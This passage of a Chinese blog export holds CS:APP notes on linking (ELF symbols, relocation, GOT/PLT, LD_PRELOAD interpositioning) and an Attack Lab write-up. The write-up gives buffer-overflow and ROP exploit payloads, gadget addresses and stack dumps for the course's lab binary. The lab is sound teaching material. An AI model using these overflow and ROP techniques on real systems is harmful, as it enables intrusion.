生成此文件的系统等||.text|已编译程序的机器码||.radata|只读数据||.data|已初始化的全局/静态变量||.bss|未初始化的静态，初始化为0的全局/静态 |||(未初始化全局是COM） ||.symtab|所有 定义或引用 的 函数 和 全局变量||.rel.text|要重定位的函数在.text的位置||.rel.data|全局变量的重定位信息||.debug||.line||.strtab||Section header table|记录每个section的位置和大小| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: REL (Relocatable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x0 Start of program headers: 0 (bytes into file) Start of section headers: 1144 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 0 (bytes) Number of program headers: 0 Size of section headers: 64 (bytes) Number of section headers: 13 Section header string table index: 12 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 Section Headers: Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .text PROGBITS 0000000000000000 00000040 0000000000000032 0000000000000000 AX 0 0 1 [ 2] .rela.text RELA 0000000000000000 00000398 0000000000000048 0000000000000018 I 10 1 8 [ 3] .data PROGBITS 0000000000000000 00000078 0000000000000010 0000000000000000 WA 0 0 8 [ 4] .bss NOBITS 0000000000000000 00000088 000000000000000c 0000000000000000 WA 0 0 4 [ 5] .rodata PROGBITS 0000000000000000 00000088 0000000000000006 0000000000000000 A 0 0 1 [ 6] .comment PROGBITS 0000000000000000 0000008e 0000000000000012 0000000000000001 MS 0 0 1 [ 7] .note.GNU-stack PROGBITS 0000000000000000 000000a0 0000000000000000 0000000000000000 0 0 1 [ 8] .eh_frame PROGBITS 0000000000000000 000000a0 0000000000000058 0000000000000000 A 0 0 8 [ 9] .rela.eh_frame RELA 0000000000000000 000003e0 0000000000000030 0000000000000018 I 10 8 8 [10] .symtab SYMTAB 0000000000000000 000000f8 00000000000001f8 0000000000000018 11 12 8 [11] .strtab STRTAB 0000000000000000 000002f0 00000000000000a7 0000000000000000 0 0 1 [12] .shstrtab STRTAB 0000000000000000 00000410 0000000000000061 0000000000000000 0 0 1 7.5 Symbol and Symbol Tables - 符号和符号表每一个symbol都代表一个 函数 / 全局变量 / 静态变量 symbol的种类有3个1.Global 本模块定义的符号。包括非静态的函数和全局变量 2.Global（Extern） 其他模块定义，本模块引用的符号。包括其他文件里的非静态的函数和全局变量 3.Local 本模块定义且只能被本模块引用的。包括静态属性的函数和全局变量。 其他 1.普通的局部变量在运行时由栈管理 2.静态属性的局部变量在.data/.bss中，且拥有唯一的名字如书上的例子： 1 2 5: 0000000000000000 4 OBJECT LOCAL DEFAULT 4 x.1794 6: 0000000000000000 4 OBJECT LOCAL DEFAULT 3 x.1797 每个symbol的结构1 2 3 4 5 6 7 8 9 typedef struct &#123; int name; //在strtab里的偏移量 char type : 4, //是函数还是数据 binding : 4; //全局还是局部 char reserved; short section; //所在节的索引，三个伪节ABS,UNDEF,COM （下面的Ndx） long value; //对Reloctable OBJ File:所在节到symbol的偏移（相对地址），Executable: 会变成绝对地址（见7.7） long size; //目标（符号）的大小（字节为单位） &#125; ELf64_Symbol; ABS: 不应被重定位的symbolUNDEF: 未定义的COMMON: 未初始化的全局 Num：.symtab表的标号，符号的个数。一个SymbolTable的例子：1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Symbol table '.symtab' contains 22 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FILE LOCAL DEFAULT ABS main.c 2: 0000000000000000 0 SECTION LOCAL DEFAULT 1 3: 0000000000000000 0 SECTION LOCAL DEFAULT 3 4: 0000000000000000 0 SECTION LOCAL DEFAULT 4 5: 0000000000000004 4 OBJECT LOCAL DEFAULT 4 zero_static 6: 0000000000000008 4 OBJECT LOCAL DEFAULT 3 ini_static 7: 0000000000000008 4 OBJECT LOCAL DEFAULT 4 uninitialize_static 8: 0000000000000000 0 SECTION LOCAL DEFAULT 5 9: 0000000000000000 0 SECTION LOCAL DEFAULT 7 10: 0000000000000000 0 SECTION LOCAL DEFAULT 8 11: 0000000000000000 0 SECTION LOCAL DEFAULT 6 12: 0000000000000000 7 FUNC GLOBAL DEFAULT 1 defined_fun 13: 0000000000000000 8 OBJECT GLOBAL DEFAULT 3 array 14: 0000000000000000 4 OBJECT GLOBAL DEFAULT 4 zero_global 15: 000000000000000c 4 OBJECT GLOBAL DEFAULT 3 ini_global 16: 0000000000000004 4 OBJECT GLOBAL DEFAULT COM uninitialize_global 17: 0000000000000000 6 OBJECT GLOBAL DEFAULT 5 const_string 18: 0000000000000007 55 FUNC GLOBAL DEFAULT 1 main 19: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND _GLOBAL_OFFSET_TABLE_ 20: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND referenced_sum 21: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND puts rt.text 里有 defined_fun,main.data 里有 array, ini_static, ini_global.bss 里有 uninitialize_static, zero_static, zero_global.rodata 里有 const_stringCOM 有 uninitialize_globalUNDF 有 referenced_sum , puts , GOT表 Type:ini_static , uninitialize_static , zero_static 都是 Local其他都是 Global 7.6 Symbol Resolution - 符号解析让所有的引用和符号表中唯一的符号定义相关联 Local Symbol: 给予唯一名字和定义 Global Symbol: 非本模块定义，留给链接器处理 7.6.1 Resolve Multiply Defined Global Symbols定义符号的强/弱 强 函数/已初始化的变量 弱 未初始化的变量 规则 不能有多个同名的强符号 同名的强符号和弱符号，选择强的符号 多个同名的弱符号任意选一个 遇到多重定义的符号时警告1 gcc -fno-common main.c func.c -o t 7.6.2 Linking with Static Libraries - 链接静态库静态库在程序链接的时候使用链接器会将程序中使用到函数的代码从库文件中拷贝到应用程序中。 静态库包含多个可重定位目标文件和描述各成员的头部，以archive存档的形式保存 优点 编译后的执行程序不需要外部的函数库支持 缺点 体积较大 静态函数库改变了，那么程序必须重新链接 多个可执行文件链接在一个库上时，运行会使库里的代码重复复制到内存，造成浪费 建立,链接方法1 2 ar rcs libvector.a addvec.o multvec.o gcc -static -o prog2C main2.o ./libvector.a 此外，链接的时候，拷贝到最终可执行文件的基本单位还是模块比如只用到了addvec.o，就不会同时打包libvector.a里面的multvec.o 7.6.3 Use static library resolve reference集合E 所有重定位的目标文件 集合U 未解析的符号引用 集合D 已经定义的符号 最后U为空，则成功 按顺序扫描，所以，一般将库放在命令行的结尾。若是有特殊的需求，比如循环引用，也可以在命令行上重复导入某个库。（出现这种情况，更好的办法应该是，这两个相互依赖的模块放在同一个.a存档文件中）。 7.7 Relocation - 重定位合并输入模块，为每个符号分配运行时地址 步骤1.重定位（section）节和（symbol）符号定义 合并各文件里同名的节，运行地址赋给每个指令这一步完成时，程序中的每一个指令和全局变量都有唯一的运行时存储器地址了。 2.重定位符号引用 链接器修改引用指向运行时地址，依靠relocation entry（重定位条目） 重定位节（section）可以看到Relocate里的ADDR是0但Exec里的ADDR是4000e8(动态链接又是相对的了，7.9）1 2 3 4 5 6 7 8 9 10 11 12 Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align # Relocate： [ 1] .text PROGBITS 0000000000000000 00000040 000000000000003e 0000000000000000 AX 0 0 1 # Executable: [ 1] .text PROGBITS 00000000004000e8 000000e8 0000000000000061 0000000000000000 AX 0 0 1 # Dynamic: [11] .text PROGBITS 00000000000004f0 000004f0 0000000000000202 0000000000000000 AX 0 0 16 重定位符号（Symbol）Value不同 1 2 3 4 5 6 7 8 Symbol Table '.symtab' Num: Value Size Type Bind Vis Ndx Name # Relocate: 15: 000000000000000c 4 OBJECT GLOBAL DEFAULT 3 ini_global # Executable: 12: 0000000000601018 4 OBJECT GLOBAL DEFAULT 5 ini_global # Dynamic: 50: 0000000000201034 4 OBJECT GLOBAL DEFAULT 21 ini_global 7.7.1 Relocation Entry - 重定位条目汇编器遇到未知的引用生成重定位条目函数放到.rel.text未初始化数据放到.rel.data 每个条目的格式1 2 3 4 5 6 struct&#123; long offset; //在所在节的偏移量 long type: 32, symbol: 32; //引用指向的symbol long addend; &#125; 两种类型：1.R_X86_64_PC32 相对寻址2.R_X86_64_32 直接寻址 1 2 3 4 5 Relocation section '.rela.text' at offset 0x398 contains 3 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000000015 000c00000002 R_X86_64_PC32 0000000000000000 defined_fun - 4 000000000021 000d00000002 R_X86_64_PC32 0000000000000000 array - 4 000000000026 001400000004 R_X86_64_PLT32 0000000000000000 referenced_sum - 4 7.7.2 Relocating Symbol References还是书上的例子比较详细…….1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // s : section // r: relocation entry for_each section s &#123; for_each relocation entry r &#123; refptr = s + r.offset; if ( r.type == R_X86_64_PC32 ) &#123; refaddr = ADDR ( s ) + r.offset; *refptr = (unsigned)( ADDR ( r.symbol ) + r.addend - refaddr ); &#125; if ( r.type == R_X86_64_32 ) &#123; *refptr = (unsigned)( ADDR ( r.symbol ) + r.addend ); &#125; &#125; &#125; PC-relative相当于 s[r.offset] = r.symbol - ( s + r.offset ) + r.addendr.symbol: symbol所在的地址（call发生时候的地址）s + r.offset: 函数真正的运行地址r.addend: 运行call时PC的变化 - 1 也就是说0x08 = 62c - 620 + (-4)1 2 3 4 5 6 7 # RELO OBJ 25: e8 00 00 00 00 callq 2a &lt;main+0x23&gt; # EXEC OBJ 61f: e8 08 00 00 00 callq 62c &lt;referenced_sum&gt; 000000000000062c &lt;referenced_sum&gt; 然后运行时候的call的过程就是刚好相反： 61f + 5(下一个指令的位置，也是为什么addend是-4）+ 8 = 62c Absolute 1 4004d9: bf 18 10 60 00 mov $0x601018, %edi = &amp;array array 就直接定位到了0x601018（我这里没重定位绝对引用的就抄书了qwqqwqqwq） 7.8 Executable Object File - 可执行格式：| 组成 | 解释 || ——– | —–|| ELF header | 只读 ||segment header table||.init||.text||.radata||.data|读写||.bss||.symtab|不加载进内存||.debug||.line||.strtab||Section header table| Program header table程序头部表描述了文件里的每一片映射到的连续内存段1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 部分 Program Headers: # 静态链接出来的 ld -o prog main.o sum.o， 代码段地址是0x400000 Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000 0x00000000000001b8 0x00000000000001b8 R E 0x200000 LOAD 0x0000000000001000 0x0000000000601000 0x0000000000601000 0x0000000000000028 0x0000000000000030 RW 0x200000 # 动态（默认）链接出来的 gcc main.c sum.c，代码段地址是相对地址0 Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x00000000000008d0 0x00000000000008d0 R E 0x200000 LOAD 0x0000000000000de0 0x0000000000200de0 0x0000000000200de0 0x0000000000000260 0x0000000000000270 RW 0x200000 7.9 Loading - 加载可执行文件输入./prog后 加载Load 代码段总是从地址0x0400000处开始，它保存编译程序的机器代码 data段在接下来的一个4KB对齐的地址处，保存已初始化的全局C变量和静态变量 bss段记录的是未初始化的全局C变量，事实上它并不占据目标文件的任何空间，只是一个占位符 运行时堆在接下来的第一个4KB对齐的地址处，通过调用malloc库向上增长，用于程序的动态内存管理 共享库段，用于加载共享库、映射共享内存和文件I/O,使用mmap和unmap函数申请和释放新的内存区 用户栈占据进程地址空间的最高部分，并向下增长，用于存放调用过程中的局部变量、函数返回地址、参数 内核代码和数据、物理存储器，它们均被映射到所有进程共享的物理页面，这就为内核提供一个便利的方法来访问内存中任何特定的位置。对于每个进程来说他们均是一样的 最顶层的内核地址空间包括了与进程有关的数据结构，如页表、内核在进程的上下文结构task_struct和mm结构，内核栈 7.10 Shared Library - 共享库加载时的链接 优点 与共享库连接的可执行文件只包含它需要的函数的引用表，而不是所有的函数代码，只有在程序执行时, 那些需要的函数代码才被拷贝到内存中。 操作系统使用虚拟内存，使得一份共享库驻留在内存中被多个程序使用，也同时节约了内存。 修改后只需要重新编译库，而不用编译使用库的程序 缺点 运行时要去链接库会花费一定的时间，执行速度相对会慢一些 1 2 gcc -shared -fpic -o libvector.so addvec.c multvec.c #创建 gcc -o prog21 main2.c ./libvector.so #链接 ppppps没加-fpic会报错…….1 2 3 gcc -shared -o nofpicvec.so addvec.c multvec.c /usr/bin/ld: /tmp/ccasjaEP.o: relocation R_X86_64_PC32 against symbol `addcnt' can not be used when making a shared object; recompile with -fPIC 7.11 Load and Link Shared Library from Applications - 从程序中加载运行时的链接 1 2 3 4 5 6 7 8 9 10 11 12 13 #include &lt;dlfcn.h&gt; /* 打开共享库，成功返回指向句柄的指针，失败返回null */ void *dlopen(const char *filename, int flag); /* 解析符号，输入是共享库句柄指针和符号名，成功返回符号地址，失败返回null */ void *dlsym(void *handle, char *symbol); /* 卸载共享库，如果此时没有其他共享库正在使用这个共享库的话 */ int dlclose(void *handle) /* 返回上面三个api发生的错误，需要手动调用，没有错误返回null */ const char *dlerror(void) 1 gcc -rdynamic -o prog2r dll.c -ldl 7.12 Position Independent Code - 位置无关编译GNU/Linux共享库, 为什么要用PIC编译?(转)PLT and GOT - the key to code sharing and dynamic libraries 实现多进程共享内存中唯一一个的库代码的方法 如果固定每个库分配到的内存片 不使用的库也会被分配空间 必须保证每个库更新之后片也不会重叠，就会变得很难管理 可以在任意位置加载而无需链接器进行修改，这样的代码被称作位置无关代码（PIC） 运行时数据段和代码段的偏移量不变 读写数据节总是放在到这个库代码节的一个已知的偏移位置即 我希望对象的地址 = 当前地址 + 已知固定的偏移。 为了利用这一特点，编译器在数据段的开头创建了一个全局偏移表（GOT）。在GOT中，目标模块所引用的每个全局数据对象都对应一个表项。编译器同时为GOT中的每个表项生成了一个重定位记录。在加载时，动态链接器重定位GOT中的每个表项，使其包含正确的绝对地址。每个包含全局数据引用的目标模块都有其自己的GOT。 7.12.1 数据1 2 3 4 5 # objdump -d libvec.so 000000000000064a &lt;addvec&gt;: 65d: 48 8b 05 84 09 20 00 mov 0x200984(%rip),%rax # 200fe8 &lt;addcnt@@Base-0x3c&gt; 664: 8b 00 mov (%rax),%eax 666: 8d 50 01 lea 0x1(%rax),%edx 1 2 3 4 # readelf --relocs libvector.so Relocation section '.rela.dyn' at offset 0x478 contains 9 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000200fe8 000900000006 R_X86_64_GLOB_DAT 0000000000201024 addcnt + 0 这里是%rip + 0x200984 = 0x200fe8 （ GOT 表里的位置 ）这样，加载时候的重定位只需要找到addcnt的真实地址，然后放到GOT表里就行了，不需要修改代码的任何值 7.12.2 函数延迟绑定 lazy binding 在这里使用的间接性被称为一个过程连接表或PLT。代码不会直接调用一个外部函数，只会通过一个PLT存根。 1 2 3 # objdump -d prog21 000000000000075a &lt;main&gt;: 778: e8 c3 fe ff ff callq 640 &lt;addvec@plt&gt; 首先main函数跳到plt表里addvec的位置0x6401 2 3 4 5 6 7 # objdump -D prog21 Disc of section .plt: 0000000000000640 &lt;addvec@plt&gt;: 640: ff 25 da 09 20 00 jmpq *0x2009da(%rip) # 201020 &lt;addvec&gt; 646: 68 01 00 00 00 pushq $0x1 64b: e9 d0 ff ff ff jmpq 620 &lt;.plt&gt; 1 2 3 4 # readelf --relocs prog21 Relocation section '.rela.plt' at offset 0x5d8 contains 2 entries: Offset Info Type Sym. Value Sym. Name + Addend 000000201020 000400000007 R_X86_64_JUMP_SLO 0000000000000000 addvec + 0 plt跳到addvec重定位的位置0x201020 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Disc of section .got.plt: 0000000000201000 &lt;_GLOBAL_OFFSET_TABLE_&gt;: 201000: e0 0d loopne 20100f &lt;_GLOBAL_OFFSET_TABLE_+0xf&gt; 201002: 20 00 and %al,(%rax) ... 201018: 36 06 ss (bad) 20101a: 00 00 add %al,(%rax) 20101c: 00 00 add %al,(%rax) 20101e: 00 00 add %al,(%rax) 201020: 46 06 rex.RX (bad) 201022: 00 00 add %al,(%rax) 201024: 00 00 add %al,(%rax) ... 初始状态下，可以看到上面0x201020的位置是…..emmmm空的…… 所以返回去运行下一条指令 pushq 1， 然后跳去.plt 1 2 3 4 0000000000000620 &lt;.plt&gt;: 620: ff 35 e2 09 20 00 pushq 0x2009e2(%rip) # 201008 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt; 626: ff 25 e4 09 20 00 jmpq *0x2009e4(%rip) # 201010 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt; 62c: 0f 1f 40 00 nopl 0x0(%rax) plt[0]就把GOT[1]（不知道是什么参数）push进栈 然后往下召唤GOT[2]里的动态链接器，确定addvec运行时的真正地址，再把地址赋给0x201020 然后以后再找的时候就可以从GOT里取了 这就是延迟绑定（lazy binding）推迟解析实际用到的函数，避免不需要的重定位。 7.13 Library Interpositioning - 库打桩用自己的代码取代库编译，链接，运行三种 基本思想：给定一个目标函数，创建一个原型与目标函数完全一样的包装函数，使用某种特殊的打桩机制，欺骗系统调用包装函数而不是打桩函数。 7.13.1 编译时打桩 (Compile-Time Interpositioning)1 2 3 4 5 6 7 8 9 10 // Example program int.c #include &lt;malloc.h&gt; #include &lt;stdio.h&gt; int main () &#123; int *p = malloc ( 32 ); free ( p ); return ( 0 ); &#125; 1 2 3 4 5 6 //Local malloc.h file #define malloc(size) mymalloc(size) #define free(ptr) myfree(ptr) void *mymalloc(size_t size); void myfree(void *ptr); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // wrapper functions in mymalloc.c #ifdef COMPILETIME //编译时传入参数-DCOMPILETIME可编译 #include &lt;malloc.h&gt; #include &lt;stdio.h&gt; void *mymalloc ( size_t size ) &#123; void *ptr = malloc ( size ); printf ( "malloc(%d)=%p\n", (int)size, ptr ); return ptr; &#125; void myfree ( void *ptr ) &#123; free ( ptr ); printf ( "free(%p)\n", ptr ); &#125; #endif 1 2 3 # 编译和链接命令 gcc -DCOMPILETIME -c mymalloc.c gcc -I. -o intc int.c mymalloc.o -I.参数告诉C预处理器在搜索系统目录之前，现在当前目录中查找malloc.h，通过malloc.h文件中 1 2 #define malloc(size) mymalloc(size) #define free(ptr) myfree(ptr) 指示预处理器用对相应包装函数的调用替换掉对目标函数的调用。 7.13.2 链接时打桩(Link-Time Interpositioning)1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #ifdef LINKTIME #include &lt;stdio.h&gt; void *__real_malloc ( size_t size ); void __real_free ( void *prt ); void *__wrap_malloc ( size_t size ) &#123; void *ptr = __real_malloc ( size ); printf ( "malloc(%d)=%p\n", (int)size, ptr ); return ptr; &#125; void __wrap_free ( void *ptr ) &#123; __real_free ( ptr ); printf ( "free(%p)\n", ptr ); &#125; #endif Linux 静态链接器支持用 --wrap f 标志进行链接时打桩。这个标志告诉链接器将 f 解析成 __wrap_f，讲 __real_ 解析成 f 。 1 2 3 gcc -DLINKTIME -c mymalloc.c gcc -c int.c gcc -Wl,--wrap,malloc -Wl,--wrap,free -o intl int.o mymalloc.o -Wl,option标志把 option传递给链接器，并把 option 中的 ， 替换成空格-Wl,--wrap,malloc 把 --wrap malloc传递给链接器-Wl,--wrap,free 把 --wrap free传递给链接器 7.13.3 运行时打桩 (Run-Time Interpositioning)编译时打桩需要能够访问程序的源代码链接时打桩需要能够访问程序的可重定位文件运行时打桩只需要能够访问可执行目标 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #ifdef RUNTIME #define _GNU_SOURCE #include &lt;dlfcn.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; // malloc wrapper function void *malloc ( size_t size ) &#123; void *( *mallocp ) ( size_t size ); // get address of libc malloc mallocp = dlsym ( RTLD_NEXT, "malloc" ); if ( ( error = dlerror () ) != NULL ) &#123; fputs ( error, stderr ); exit ( 1 ); &#125; char *ptr = mallocp ( size ); printf ( "malloc %p size %p\n", ptr, (int)size ); return ptr; &#125; // free wrapper function void free ( void *ptr ) &#123; void ( *freep ) ( void *ptr ); char *error; if ( !ptr ) return; // get address of libc free freep = dlsym ( RTLD_NEXT, "free" ); if ( ( error = dlerror () ) != NULL ) &#123; fputs ( error, stderr ); exit ( 1 ); &#125; freep ( ptr ); printf ( "free %p\n", ptr ); &#125; #endif 1 2 3 gcc -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl gcc -o intr int.c LD_PRELOAD="./mymalloc.so" ./intr 如果 LD_PRELOAD 环境变量被设置为一个共享库路径名的列表（以空格键或分号分隔），那么当加载和执行一个程序，需要解析未定义的引用时，动态链接器（LD_LINUX.SO）会先搜索LD_PRELAOD库，然后才搜索其他库。 ​​]]></content>
      <categories>
        <category>Computer System a Programmer&#39;s Perspective</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS:APP-ch3] Attack Lab]]></title>
    <url>%2F2017%2F08%2F30%2FCSAPP%2Fattack%2F</url>
    <content type="text"><![CDATA[[CS:APP-ch3] Attack LabPart 1：缓冲区溢出攻击Phase 11 2 3 4 5 6 7 8 9 [--------------------------code-----------------------] 0x4017a5: nop 0x4017a6: nop 0x4017a7: nop =&gt; 0x4017a8 &lt;getbuf&gt;: sub $0x28,%rsp 0x4017ac &lt;getbuf+4&gt;: mov %rsp,%rdi 0x4017af &lt;getbuf+7&gt;: callq 0x401a40 &lt;Gets&gt; 0x4017b4 &lt;getbuf+12&gt;: mov $0x1,%eax 0x4017b9 &lt;getbuf+17&gt;: add $0x28,%rsp buf开创0x28 = 40 个字节随便填充40个字符 1 2 3 4 5 6 7 8 9 10 Dump of assembler code for function touch1: 0x00000000004017c0 &lt;+0&gt;: sub $0x8,%rsp 0x00000000004017c4 &lt;+4&gt;: movl $0x1,0x202d0e(%rip) # 0x6044dc &lt;vlevel&gt; 0x00000000004017ce &lt;+14&gt;: mov $0x4030c5,%edi 0x00000000004017d3 &lt;+19&gt;: callq 0x400cc0 &lt;puts@plt&gt; 0x00000000004017d8 &lt;+24&gt;: mov $0x1,%edi 0x00000000004017dd &lt;+29&gt;: callq 0x401c8d &lt;validate&gt; 0x00000000004017e2 &lt;+34&gt;: mov $0x0,%edi 0x00000000004017e7 &lt;+39&gt;: callq 0x400e40 &lt;exit@plt&gt; End of assembler dump. touch1的地址是0x4017c0因为是little endian的机器所以将c0 17 40 00 00 00 00 00用hex2raw转化为字符，添加到40个a的后面就行了 结果：1 2 3 4 5 6 7 8 9 [-----------stack--------------] 0000| 0x5561dc78 ('a' &lt;repeats 40 times&gt;, "\300\027@") 0008| 0x5561dc80 ('a' &lt;repeats 32 times&gt;, "\300\027@") 0016| 0x5561dc88 ('a' &lt;repeats 24 times&gt;, "\300\027@") 0024| 0x5561dc90 ('a' &lt;repeats 16 times&gt;, "\300\027@") 0032| 0x5561dc98 ("aaaaaaaa\300\027@") 0040| 0x5561dca0 --&gt; 0x4017c0 (&lt;touch1&gt;: sub $0x8,%rsp) 0048| 0x5561dca8 --&gt; 0x0 0056| 0x5561dcb0 --&gt; 0x401f24 (&lt;launch+112&gt;: cmpl $0x0,0x2025bd(%rip) # 0x6044e8 &lt;is_checker&gt;) Phase 2touch2 有参数传递，要改变寄存器rdi里存放的值 结果：1 2 3 4 5 6 7 8 9 [---------------------stack---------------------------] 0000| 0x5561dc78 ('a' &lt;repeats 40 times&gt;, "\260\334aU") 0008| 0x5561dc80 ('a' &lt;repeats 32 times&gt;, "\260\334aU") 0016| 0x5561dc88 ('a' &lt;repeats 24 times&gt;, "\260\334aU") 0024| 0x5561dc90 ('a' &lt;repeats 16 times&gt;, "\260\334aU") 0032| 0x5561dc98 ("aaaaaaaa\260\334aU") 0040| 0x5561dca0 --&gt; 0x5561dcb0 --&gt; 0xc359b997fac7c748 0048| 0x5561dca8 --&gt; 0x4017ec (&lt;touch2&gt;: sub $0x8,%rsp) 0056| 0x5561dcb0 --&gt; 0xc359b997fac7c748 依旧是40个a，接着是把返回的地址改为调用0x5561dcb0（修改寄存器的代码），修改0x5561dca8的值为调用touch2，修改0x5561dcb0的值为调用添加的代码code栈的指针指向0040调用完code之后，刚好向下移动到0048调用touch2 code代码：1 2 mov $0x59b997fa,%rdi ret 编译：1 2 3 gcc -c code.s objdump -d code.o &gt; code.d ./hex2raw -i code.d &gt; code.r 看到网上的码还有一步pushq $0x004017ec （touch2的地址）结果：ret时返回到0x5561dc78（%rsp的地址？）执行注入的代码，然后直接调用touch2了1 2 3 4 5 6 7 8 9 [-----------------------stack-------------------------] 0000| 0x5561dc78 --&gt; 0x6859b997fac7c748 0008| 0x5561dc80 --&gt; 0x303030c3004017ec 0016| 0x5561dc88 ('0' &lt;repeats 24 times&gt;, "x\334aU") 0024| 0x5561dc90 ('0' &lt;repeats 16 times&gt;, "x\334aU") 0032| 0x5561dc98 ("00000000x\334aU") 0040| 0x5561dca0 --&gt; 0x5561dc78 --&gt; 0x6859b997fac7c748 0048| 0x5561dca8 --&gt; 0x0 0056| 0x5561dcb0 --&gt; 0x401f24 (&lt;launch+112&gt;: cmpl $0x0,0x2025bd(%rip) # 0x6044e8 &lt;is_checker&gt;) Phase 3touch3参数是string将str存到0x5561dcb8的地址上code将str拷贝到%rdi调用同上 1 2 3 4 5 6 7 8 9 [-----------------------stack-------------------------] 0000| 0x5561dc78 ('a' &lt;repeats 40 times&gt;) 0008| 0x5561dc80 ('a' &lt;repeats 32 times&gt;) 0016| 0x5561dc88 ('a' &lt;repeats 24 times&gt;) 0024| 0x5561dc90 ('a' &lt;repeats 16 times&gt;) 0032| 0x5561dc98 ("aaaaaaaa") 0040| 0x5561dca0 --&gt; 0x401900 (&lt;touch3+6&gt;: (bad)) 0048| 0x5561dca8 --&gt; 0x9 ('\t') 0056| 0x5561dcb0 --&gt; 0x401f24 (&lt;launch+112&gt;: ) str是cookie的地址值用ascii转为字符串（0x）59b997fa对应35 39 62 39 39 37 66 61 00（字符串后面补空字符’\0’） code代码：1 2 mov $0x5561dcb8,%rdi ret Part2: ROPPhase 4看了看文档，解释的很清楚w利用已经有的代码片段gadget，通过汇编的解释，来调用自己想要执行的程序 第一个程序还是调用touch2要将cookiee放入rdi之中但pop %rdi（5f）的指令很少出现所以转换为1 2 3 popq %rax movq %rax %rdi ret 根据表里的编码popq %rax的编码是58movq %rax %rdi的编码是48 89 c7 在rtarget.d里找到这两个代码片段 gadget11 2 3 00000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq 地址为0x4019ab gadget21 2 3 4 5 6 7 00000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq 00000000004019ae &lt;setval_237&gt;: 4019ae: c7 07 48 89 c7 c7 movl $0xc7c78948,(%rdi) 4019b4: c3 retq 273的地址是0x4019a2 转化为little endian的形式然后就是合并，转换为字符串注入1 2 cat offeset gadget1 cookiee gadget2 touch2 &gt; code ./hex2raw -i code &gt; code.r 然后就成功了1 2 3 4 5 6 7 8 9 10 [---------------stack----------------------] 0000| 0x7ffffffee8a0 ('a' &lt;repeats 40 times&gt;, "\253\031@") 0008| 0x7ffffffee8a8 ('a' &lt;repeats 32 times&gt;, "\253\031@") 0016| 0x7ffffffee8b0 ('a' &lt;repeats 24 times&gt;, "\253\031@") 0024| 0x7ffffffee8b8 ('a' &lt;repeats 16 times&gt;, "\253\031@") 0032| 0x7ffffffee8c0 ("aaaaaaaa\253\031@") 0040| 0x7ffffffee8c8 --&gt; 0x4019ab (&lt;addval_219+4&gt;: pop %rax) 0048| 0x7ffffffee8d0 --&gt; 0x59b997fa 0056| 0x7ffffffee8d8 --&gt; 0x4019a2 (&lt;addval_273+2&gt;: mov %rax,%rdi) 0064| 0x7ffffffee8e0 --&gt; 0x4017ec (&lt;touch2&gt;: sub $0x8,%rsp) 一开始试了237，但不知道为什么这个返回的时候返回到了别的函数导致segmentation fault]]></content>
      <categories>
        <category>Computer System a Programmer&#39;s Perspective</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
</search>
